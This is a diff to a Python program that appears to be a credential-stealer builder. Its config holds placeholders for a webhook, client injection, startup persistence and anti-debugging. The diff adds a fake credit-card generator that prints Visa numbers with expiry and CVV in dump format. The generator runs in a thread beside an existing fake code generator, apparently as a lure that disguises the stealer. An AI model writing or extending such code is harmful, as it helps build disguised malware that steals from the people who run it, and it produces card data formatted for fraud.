@@ -17,12 +17,15 @@ from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
+from credit_card_info_generator import generate_credit_card
 
 # CONFIG 
 
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
+FakeCCgen = '%FakeCCGen%' 
+
 injection = '%Injection%'
 Startup = '%Startup%'
 antidebugging = '%No_Debug%'  
@@ -298,6 +301,34 @@ def fakegen():
 
             thread = threading.Thread(target=generate_codes, args=(essay,))
             thread.start()
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+def fakeccgen():
+    try:
+        time.sleep(1)
+        clear_command_prompt()
+        print('''
+░█████╗░░█████╗░░██████╗░███████╗███╗░░██╗
+██╔══██╗██╔══██╗██╔════╝░██╔════╝████╗░██║
+██║░░╚═╝██║░░╚═╝██║░░██╗░█████╗░░██╔██╗██║
+██║░░██╗██║░░██╗██║░░╚██╗██╔══╝░░██║╚████║
+╚█████╔╝╚█████╔╝╚██████╔╝███████╗██║░╚███║
+░╚════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚══╝
+        ''')
+
+        while True:
+            essay = input("How many credit cards do you want to generate? (Enter a number): ")
+            if not essay.isdigit() or int(essay) < 1:
+                print("Invalid input. Please enter a positive integer.")
+                continue
+            essay = int(essay)
+
+            for _ in range(essay):
+                card = generate_credit_card('Visa') 
+                card_info = f"{card['card_number']}|{card['expiry_date'][0:2]}|{card['expiry_date'][-2:]}|{card['cvv']}"
+                print(card_info)
 
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -3273,6 +3304,11 @@ def gatha():
         us = threading.Thread(target=fakegen)
         us.start()
         First_Thread.append(us)
+    if FakeCCgen == True:
+        fcc = threading.Thread(target=fakeccgen)
+        fcc.start()
+        First_Thread.append(fcc)
+
 
     if FakeWebhook == True:
         wb = threading.Thread(target=webhook_tools)
